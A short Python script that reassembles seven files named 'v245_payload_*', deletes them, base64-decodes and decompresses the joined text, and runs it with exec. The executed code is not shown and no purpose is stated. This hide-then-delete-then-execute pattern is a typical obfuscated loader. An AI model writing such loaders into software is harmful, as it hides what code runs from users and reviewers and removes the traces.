from pathlib import Path
import base64
import zlib

here = Path(__file__).resolve().parent
parts = [here / f"v245_payload_{index:02d}" for index in range(7)]
payload = "".join(part.read_text(encoding="utf-8") for part in parts)
for part in parts:
    part.unlink()
source = zlib.decompress(base64.b64decode(payload))
exec(compile(source, str(Path(__file__)), "exec"))
